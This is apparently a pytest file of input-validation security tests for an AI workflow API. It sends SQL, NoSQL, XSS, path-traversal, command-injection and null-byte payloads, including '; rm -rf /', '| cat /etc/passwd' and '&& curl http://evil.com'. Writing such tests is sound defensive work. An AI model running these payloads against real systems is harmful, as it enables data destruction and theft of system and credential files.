"""Input Validation security tests.

Tests for SEC-INP-001 to SEC-INP-008 from the testing plan.
"""

import httpx


# ==========================================================================
# SEC-INP-001: SQL injection blocked
# ==========================================================================
class TestSQLInjectionBlocked:
    """Tests for SQL injection prevention."""

    def test_sql_injection_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that SQL injection is blocked.

        SEC-INP-001: SQL injection blocked
        """
        # Try various SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE workflows; --",
            "1 OR 1=1",
            "1; DELETE FROM runs WHERE 1=1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker'); --",
        ]

        for payload in sql_payloads:
            workflow = {
                "name": payload,
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "step1",
                            "name": payload,
                            "type": "llm",
                            "config": {
                                "model": "claude-sonnet-4-20250514",
                                "max_tokens": 10,
                            },
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            resp = api_client.post("/api/v1/workflows", json=workflow)
            # Should either sanitize or reject
            assert resp.status_code in (200, 201, 400, 422)

    def test_sql_injection_in_query_params(
        self, api_client: httpx.Client
    ) -> None:
        """Test SQL injection in query parameters."""
        sql_payloads = [
            "?id=1 OR 1=1",
            "?name='; DROP TABLE--",
            "?limit=1; DELETE FROM runs",
        ]

        for payload in sql_payloads:
            resp = api_client.get(f"/api/v1/workflows{payload}")
            # Should handle safely
            assert resp.status_code in (200, 400, 422)


# ==========================================================================
# SEC-INP-002: NoSQL injection blocked
# ==========================================================================
class TestNoSQLInjectionBlocked:
    """Tests for NoSQL injection prevention."""

    def test_nosql_injection_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that NoSQL injection is blocked.

        SEC-INP-002: NoSQL injection blocked
        """
        nosql_payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$where": "this.password == 'x'"},
            {"$regex": ".*"},
        ]

        for payload in nosql_payloads:
            workflow = {
                "name": "nosql-test",
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "step1",
                            "name": "Step",
                            "type": "llm",
                            "config": payload,
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            resp = api_client.post("/api/v1/workflows", json=workflow)
            # Should reject invalid config
            assert resp.status_code in (200, 201, 400, 422)


# ==========================================================================
# SEC-INP-003: XSS blocked
# ==========================================================================
class TestXSSBlocked:
    """Tests for XSS prevention."""

    def test_xss_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that XSS in input is blocked.

        SEC-INP-003: XSS in input blocked
        """
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
        ]

        for payload in xss_payloads:
            workflow = {
                "name": payload,
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "step1",
                            "name": payload,
                            "type": "llm",
                            "config": {
                                "model": "claude-sonnet-4-20250514",
                                "system_prompt": payload,
                                "max_tokens": 10,
                            },
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            resp = api_client.post("/api/v1/workflows", json=workflow)
            # Should accept (and sanitize on output) or reject
            assert resp.status_code in (200, 201, 400, 422)


# ==========================================================================
# SEC-INP-004: Path traversal blocked
# ==========================================================================
class TestPathTraversalBlocked:
    """Tests for path traversal prevention."""

    def test_path_traversal_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that path traversal is blocked.

        SEC-INP-004: ../ blocked
        """
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for payload in path_payloads:
            workflow = {
                "name": "path-traversal-test",
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "step1",
                            "name": "Step",
                            "type": "tool",
                            "config": {
                                "tool_name": "read_file",
                                "tool_input": {
                                    "path": payload,
                                },
                            },
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            resp = api_client.post("/api/v1/workflows", json=workflow)
            # Should be blocked or sandboxed
            assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-INP-005: Command injection blocked
# ==========================================================================
class TestCommandInjectionBlocked:
    """Tests for command injection prevention."""

    def test_command_injection_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that command injection is blocked.

        SEC-INP-005: ; rm -rf / blocked
        """
        cmd_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl http://evil.com",
            "$(rm -rf /)",
            "`rm -rf /`",
            "\n rm -rf /",
        ]

        for payload in cmd_payloads:
            workflow = {
                "name": "cmd-injection-test",
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "step1",
                            "name": "Step",
                            "type": "tool",
                            "config": {
                                "tool_name": "execute_command",
                                "tool_input": {
                                    "command": f"ls {payload}",
                                },
                            },
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            resp = api_client.post("/api/v1/workflows", json=workflow)
            # Should be blocked by policy or Airlock
            assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-INP-006: Oversized payload rejected
# ==========================================================================
class TestOversizedPayloadRejected:
    """Tests for oversized payload rejection."""

    def test_oversized_payload_rejected(
        self, api_client: httpx.Client
    ) -> None:
        """Test that large payloads are rejected.

        SEC-INP-006: Large payload rejected
        """
        # Create a very large payload (10MB)
        large_data = "x" * (10 * 1024 * 1024)

        workflow = {
            "name": "oversized-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "step1",
                        "name": "Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "system_prompt": large_data,
                            "max_tokens": 10,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        try:
            resp = api_client.post(
                "/api/v1/workflows",
                json=workflow,
                timeout=60.0,
            )
            # Should be rejected (413 or 400)
            assert resp.status_code in (400, 413, 422)
        except httpx.ReadTimeout:
            # Timeout is acceptable for large payload
            pass

    def test_reasonable_payload_accepted(
        self, api_client: httpx.Client
    ) -> None:
        """Test that reasonable payloads are accepted."""
        workflow = {
            "name": "reasonable-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "step1",
                        "name": "Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "system_prompt": "Hello",
                            "max_tokens": 10,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201)


# ==========================================================================
# SEC-INP-007: Malformed JSON rejected
# ==========================================================================
class TestMalformedJSONRejected:
    """Tests for malformed JSON rejection."""

    def test_malformed_json_rejected(
        self, api_client: httpx.Client
    ) -> None:
        """Test that bad JSON is rejected.

        SEC-INP-007: Bad JSON rejected
        """
        malformed_payloads = [
            "{invalid json}",
            "{'single': 'quotes'}",
            '{"trailing": "comma",}',
            '{"missing": }',
            "null",
            "",
        ]

        for payload in malformed_payloads:
            try:
                # Send raw string, not JSON
                resp = api_client.post(
                    "/api/v1/workflows",
                    content=payload,
                    headers={"Content-Type": "application/json"},
                )
                # Should reject with 400
                assert resp.status_code in (400, 422)
            except Exception:
                # Exception is acceptable for malformed JSON
                pass


# ==========================================================================
# SEC-INP-008: Null byte injection
# ==========================================================================
class TestNullByteInjection:
    """Tests for null byte injection prevention."""

    def test_null_byte_injection(
        self, api_client: httpx.Client
    ) -> None:
        """Test that null bytes are blocked.

        SEC-INP-008: Null bytes blocked
        """
        null_payloads = [
            "test\x00malicious",
            "file.txt\x00.exe",
            "/safe/path\x00/../../../etc/passwd",
        ]

        for payload in null_payloads:
            workflow = {
                "name": payload,
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "step1",
                            "name": "Step",
                            "type": "llm",
                            "config": {
                                "model": "claude-sonnet-4-20250514",
                                "max_tokens": 10,
                            },
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            try:
                resp = api_client.post("/api/v1/workflows", json=workflow)
                # Should sanitize or reject
                assert resp.status_code in (200, 201, 400, 422)
            except Exception:
                # Exception is acceptable for null bytes
                pass
